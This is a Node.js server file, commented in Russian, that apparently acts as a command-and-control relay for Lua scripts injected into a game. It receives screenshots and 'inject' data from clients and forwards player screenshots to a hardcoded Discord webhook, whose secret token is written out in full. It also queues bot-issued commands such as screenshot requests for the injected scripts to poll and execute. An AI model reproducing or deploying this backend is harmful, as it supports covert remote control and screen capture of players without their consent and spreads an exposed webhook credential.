const http = require('http');
const fetch = require('node-fetch');

const WEBHOOK_URL = "https://discord.com/api/webhooks/1397978005007110334/13sdkqWcsZu_YoyBgOpoWgrPfOzHBRL-R8dydXTLYI7KZIc4jSKlpcUX16vrrrC1nQqS";

let lastCommand = "";
let lastInjectData = null;

const server = http.createServer((req, res) => {
    // Прием данных от Lua (скриншоты и инжекты)
    if (req.url === '/inject' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            const data = JSON.parse(body);
            
            if (data.type === "screenshot") {
                // Отправляем скриншот в Discord
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `📸 **Скриншот от ${data.player}**`,
                        embeds: [{
                            image: { url: data.image }
                        }]
                    })
                });
            } else {
                lastInjectData = data; // Сохраняем данные инжекта
            }
            
            res.writeHead(200);
            res.end("OK");
        });
        return;
    }

    // Установка команды от бота (например, /screenshot)
    if (req.url === '/command' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            const { command } = JSON.parse(body);
            lastCommand = command;
            res.writeHead(200);
            res.end("OK");
        });
        return;
    }

    // Получение данных для Lua (команды + инжекты)
    if (req.url === '/data' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            command: lastCommand,
            injectData: lastInjectData
        }));
        lastCommand = ""; // Сбрасываем команду
        return;
    }

    res.writeHead(404);
    res.end("Not Found");
});

server.listen(process.env.PORT || 3000);
